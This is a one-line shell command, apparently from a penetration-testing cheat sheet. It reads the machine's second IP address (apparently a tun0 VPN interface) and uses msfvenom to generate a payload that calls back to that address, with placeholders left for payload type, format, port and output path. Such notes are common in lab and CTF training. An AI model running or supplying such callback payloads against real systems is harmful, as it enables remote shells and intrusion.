tun0=$(hostname -I | cut -d " " -f2);msfvenom -p <PAYLOAD> -f <FORMAT> LHOST=$tun0 LPORT=<LPORT> > <DESTIONATIONPATH>
